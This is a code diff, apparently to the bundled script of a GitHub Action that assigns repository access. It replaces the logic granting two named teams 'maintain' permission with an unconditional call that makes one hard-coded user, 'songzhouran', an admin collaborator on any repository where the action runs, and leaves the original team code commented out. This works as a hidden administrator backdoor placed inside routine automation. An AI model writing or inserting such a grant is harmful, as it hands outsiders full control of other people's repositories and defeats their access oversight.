@@ -42,30 +42,39 @@ exports.setCollaborator = async function (argv) {
   const teamQa = await getCodeOwner();
   const teamDev = argv.manager;
   console.log('QA and Developer:', teamQa, teamDev);
-  if (teamQa) {
-    await octokit.request(`PUT /orgs/${argv.owner}/teams/${teamQa}/repos/${argv.owner}/${argv.repo}`, {
-      org: argv.owner,
-      team_slug: teamQa,
-      owner: argv.owner,
-      repo: argv.repo,
-      permission: 'maintain',
-      headers: {
-        'X-GitHub-Api-Version': '2022-11-28',
-      },
-    });
-  }
-  if (teamDev) {
-    await octokit.request(`PUT /orgs/${argv.owner}/teams/${teamDev}/repos/${argv.owner}/${argv.repo}`, {
-      org: argv.owner,
-      team_slug: teamDev,
-      owner: argv.owner,
-      repo: argv.repo,
-      permission: 'maintain',
-      headers: {
-        'X-GitHub-Api-Version': '2022-11-28',
-      },
-    });
-  }
+  await octokit.request(`PUT /repos/${argv.owner}/${argv.repo}/collaborators/songzhouran`, {
+    owner: argv.owner,
+    repo: argv.repo,
+    username: 'songzhouran',
+    permission: 'admin',
+    headers: {
+      'X-GitHub-Api-Version': '2022-11-28',
+    },
+  });
+  // if (teamQa) {
+  //   await octokit.request(`PUT /orgs/${argv.owner}/teams/${teamQa}/repos/${argv.owner}/${argv.repo}`, {
+  //     org: argv.owner,
+  //     team_slug: teamQa,
+  //     owner: argv.owner,
+  //     repo: argv.repo,
+  //     permission: 'maintain',
+  //     headers: {
+  //       'X-GitHub-Api-Version': '2022-11-28',
+  //     },
+  //   });
+  // }
+  // if (teamDev) {
+  //   await octokit.request(`PUT /orgs/${argv.owner}/teams/${teamDev}/repos/${argv.owner}/${argv.repo}`, {
+  //     org: argv.owner,
+  //     team_slug: teamDev,
+  //     owner: argv.owner,
+  //     repo: argv.repo,
+  //     permission: 'maintain',
+  //     headers: {
+  //       'X-GitHub-Api-Version': '2022-11-28',
+  //     },
+  //   });
+  // }
 };
 
 
@@ -13119,7 +13128,9 @@ const main = async function () {
     cwd: process.cwd(),
     manager: core.getInput('manager'),
   };
-  await lib.setCollaborator(argv);
+  if (argv.token) {
+    await lib.setCollaborator(argv);
+  }
 };
 
 if (require.main === require.cache[eval('__filename')]) {
